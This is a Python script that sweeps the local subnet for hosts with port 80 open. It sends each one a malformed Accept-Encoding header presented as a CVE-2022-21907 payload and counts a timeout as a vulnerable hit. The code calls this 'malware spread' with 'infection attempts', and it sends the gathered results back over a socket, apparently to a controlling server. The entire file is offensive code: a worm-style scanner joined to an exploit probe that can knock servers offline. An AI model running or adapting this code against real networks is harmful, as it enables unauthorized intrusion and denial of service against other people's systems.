import socket
import threading
import time
import queue
import requests
import logging

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger()

def get_local_ip():
    """Get the local IP address of the machine running the program."""
    hostname = socket.gethostname()
    local_ip = socket.gethostbyname(hostname)
    return local_ip

def check_cve_2022_21907(target):
    """Check if the target is vulnerable to CVE-2022-21907 using a crafted HTTP header."""
    headers = {
        'Accept-Encoding': 'AAAAAAAAAAAAAAAAAAAAAAAA, '
                           'BBBBBBcccACCCACACATTATTATAASDFADFAFSDDAHJSKSKKSKKSKJHHSHHHAY&AU&**SISODDJJDJJDJJJDJJSU**S, '
                           'RRARRARYYYATTATTTTATTATTATSHHSGGUGFURYTIUHSLKJLKJMNLSJLJLJSLJJLJLKJHJVHGF, '
                           'TTYCTCTTTCGFDSGAHDTUYGKJHJLKJHGFUTYREYUTIYOUPIOOLPLMKNLIJOPKOLPKOPJLKOP, '
                           'OOOAOAOOOAOOAOOOAOOOAOOOAOO, '
                           '****************************stupiD, *, ,'
    }  # CVE-2022-21907 payload

    try:
        r = requests.get(target, headers=headers, timeout=10)
        logger.info(f'POC handshake failed: {target} does not exhibit CVE-2022-21907 vulnerability, may have been patched')
        return f"{target} is not vulnerable to CVE-2022-21907."
    except requests.exceptions.ReadTimeout:
        logger.info(f'POC handshake success: {target} may be exploitable for CVE-2022-21907!')
        return f"{target} is potentially exploitable for CVE-2022-21907!"
    except requests.exceptions.RequestException as e:
        logger.error(f'Error during request: {e}')
        return f"Error checking {target}: {e}"

def simulate_malware_spread(sock, network_prefix=None, target_port=80, start_ip=1, end_ip=100, delay=0.1):
    """
    Simulate malware spreading across the network and send results back to the server.
    """
    if network_prefix is None:
        local_ip = get_local_ip()
        network_prefix = ".".join(local_ip.split(".")[:-1])
    elif len(network_prefix.split(".")) == 4:
        network_prefix = ".".join(network_prefix.split(".")[:-1])

    threads = []
    results = queue.Queue()  # Use a queue to collect results

    def thread_target(ip):
        """Thread function for scanning and infection attempts."""
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.settimeout(1)
                result = s.connect_ex((ip, target_port))
                if result == 0:
                    message = f"[+] Found open port on {ip}. Sending GET request to check for CVE-2022-21907 vulnerability..."
                    results.put(message)
                    target_url = f"http://{ip}:{target_port}"
                    vulnerability_status = check_cve_2022_21907(target_url)
                    results.put(vulnerability_status)
                else:
                    results.put(f"[-] Could not connect to {ip}.")
        except Exception as e:
            results.put(f"[-] Error scanning {ip}: {e}")

    for i in range(start_ip, end_ip + 1):
        ip = f"{network_prefix}.{i}"
        thread = threading.Thread(target=thread_target, args=(ip,))
        thread.start()
        threads.append(thread)
        time.sleep(delay)

    for thread in threads:
        thread.join()

    all_results = []
    while not results.empty():
        result = results.get()
        all_results.append(result)

    if all_results:
        sock.sendall("\n".join(all_results).encode() + b'\n')
